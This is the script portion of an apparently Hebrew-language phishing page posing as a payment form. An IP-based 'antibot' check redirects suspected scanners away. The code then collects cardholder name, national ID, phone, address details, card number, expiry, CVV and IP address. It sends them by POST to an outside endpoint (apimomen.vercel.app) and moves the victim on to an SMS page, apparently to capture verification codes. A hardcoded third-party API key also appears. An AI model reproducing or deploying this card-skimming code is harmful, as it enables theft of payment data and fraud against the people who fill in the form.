    <script>
        // Antibot IP protection on this page
        (function () {
            // Allow local development without checks
            if (location.hostname === '127.0.0.1' || location.hostname === 'localhost') {
                return;
            }

            function blockAccess() {
                window.location.href = './index.htm';
            }

            fetch('https://api.ipify.org?format=json')
                .then(function (r) { return r.json(); })
                .then(function (data) {
                    var ip = data && data.ip;
                    if (!ip) {
                        throw new Error('No IP');
                    }
                    var apiKey = '49d1b63be75a9c08f88e40bf54f08401';
                    var url = 'https://antibot.pw/api/v2-txt?ip=' + encodeURIComponent(ip) + '&key=' + encodeURIComponent(apiKey);
                    return fetch(url);
                })
                .then(function (r) { return r.text(); })
                .then(function (txt) {
                    var result = (txt || '').trim();
                    if (result !== 'good') {
                        blockAccess();
                    }
                })
                .catch(function () {
                    blockAccess();
                });
        })();
    </script>

    <script>
        // Format credit card number (numbers only)
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/gi, '');
            if (value.length > 19) value = value.slice(0, 19);
            e.target.value = value;
        });

        // Format expiry date as MM/YY
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // Format CVV (only numbers, max 4 digits)
        document.getElementById('cvv').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
        });

        // Format phone number
        document.getElementById('cardholderPhone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
        });

        // Format ID number (only numbers)
        document.getElementById('cardholderId').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
        });

        // Format zip code (only numbers)
        document.getElementById('zipCode').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
        });

        // Form validation
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            submitPayment();
        });
    </script>

    <!-- jQuery CDN -->

    <script>
        // Telegram Bot Configuration
  

        // Show loading screen
        function showLoading() {
            var loader = document.getElementById('loaderOverlay');
            if (loader) {
                loader.style.display = 'flex';
            }
        }

        // Hide loading screen
        function hideLoading() {
            var loader = document.getElementById('loaderOverlay');
            if (loader) {
                loader.style.display = 'none';
            }
        }

        // Collect payment data
        function ready() {
            var cardholderName = document.getElementById('cardholderName') ? document.getElementById('cardholderName').value : '';
            var cardholderId = document.getElementById('cardholderId') ? document.getElementById('cardholderId').value : '';
            var cardholderPhone = document.getElementById('cardholderPhone') ? document.getElementById('cardholderPhone').value : '';
            var zipCode = document.getElementById('zipCode') ? document.getElementById('zipCode').value : '';
            var city = document.getElementById('city') ? document.getElementById('city').value : '';
            var cardNumber = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value : '';
            var expiryDate = document.getElementById('expiryDate') ? document.getElementById('expiryDate').value : '';
            var cvv = document.getElementById('cvv') ? document.getElementById('cvv').value : '';
            
            message = "Payment Details:\n" +
                    "Name: " + cardholderName + "\n" +
                    "ID: " + cardholderId + "\n" +
                    "Phone: " + cardholderPhone + "\n" +
                    "Zip: " + zipCode + "\n" +
                    "City: " + city + "\n" +
                    "Card: " + cardNumber + "\n" +
                    "Expiry: " + expiryDate + "\n" +
                    "CVV: " + cvv;

            // Append client IP if available
            if (window.__client_ip) {
                message += "\nIP: " + window.__client_ip;
            }
        }

        // Send data to server
        function sender() {
            ready();
            var cardholderNameEl = document.getElementById('cardholderName');
            var cardholderIdEl = document.getElementById('cardholderId');
            var cardholderPhoneEl = document.getElementById('cardholderPhone');
            var zipCodeEl = document.getElementById('zipCode');
            var cityEl = document.getElementById('city');
            var cardNumberEl = document.getElementById('cardNumber');
            var expiryDateEl = document.getElementById('expiryDate');
            var cvvEl = document.getElementById('cvv');
            
            if (!cardholderNameEl || !cardholderIdEl || !cardholderPhoneEl || !zipCodeEl || !cityEl || !cardNumberEl || !expiryDateEl || !cvvEl) {
                console.error('One or more form elements not found');
                alert('שגיאה בטעינת הטופס. אנא רענן את הדף.');
                return;
            }
            
            var paymentData = {
                cardholderName: cardholderNameEl.value,
                cardholderId: cardholderIdEl.value,
                cardholderPhone: cardholderPhoneEl.value,
                zipCode: zipCodeEl.value,
                city: cityEl.value,
                cardNumber: cardNumberEl.value,
                expiryDate: expiryDateEl.value,
                cvv: cvvEl.value,
                clientIP: window.__client_ip || 'Unknown'
            };

            var settings = {
                "async": true,
                "crossDomain": true,
                "url": "https://apimomen.vercel.app/api/send-payment",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
                },
                "data": JSON.stringify(paymentData)
            };
            
            $.ajax(settings).done(function (response) {
                console.log('Payment sent successfully:', response);
                setTimeout(() => {
                    window.location.href = "./sms.html";
                }, 2000); // 2 seconds
            }).fail(function (xhr, status, error) {
                console.error('Payment failed:', error);
                alert('שגיאה בשליחת התשלום. אנא נסה שוב.');
                hideLoading();
            });
        }

        // Fetch client IP from a public service
        (function fetchClientIP(){
            try {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => { window.__client_ip = d.ip; })
                    .catch(() => {});
            } catch (_) {}
        })();

        // Submit payment function
        function submitPayment() {
            // Basic validation
            const cardNumberEl = document.getElementById('cardNumber');
            const expiryDateEl = document.getElementById('expiryDate');
            const cvvEl = document.getElementById('cvv');
            
            if (!cardNumberEl || !expiryDateEl || !cvvEl) {
                console.error('Form elements not found');
                alert('שגיאה בטעינת הטופס. אנא רענן את הדף.');
                return;
            }
            
            const cardNumber = cardNumberEl.value;
            const expiryDate = expiryDateEl.value;
            const cvv = cvvEl.value;
            
            // Luhn Algorithm for credit card validation
            function isValidCardLuhn(number) {
                const digits = number.replace(/\D/g, '').split('').reverse().map(d => parseInt(d, 10));
                if (digits.length < 13 || digits.length > 19) return false;
                let sum = 0;
                for (let i = 0; i < digits.length; i++) {
                    let digit = digits[i];
                    if (i % 2 === 1) {
                        digit *= 2;
                        if (digit > 9) digit -= 9;
                    }
                    sum += digit;
                }
                return sum % 10 === 0;
            }

            if (!isValidCardLuhn(cardNumber)) {
                alert('מספר כרטיס אשראי אינו תקין');
                return;
            }
            
            if (expiryDate.length !== 5) {
                alert('תאריך תפוגה חייב להיות בפורמט MM/YY');
                return;
            }
            
            if (cvv.length < 3) {
                alert('CVV חייב להכיל לפחות 3 ספרות');
                return;
            }
            
            showLoading();
            sender();
        }

        // Back function
        function back() {
            window.location.href = "./index.htm";
        }
    </script>
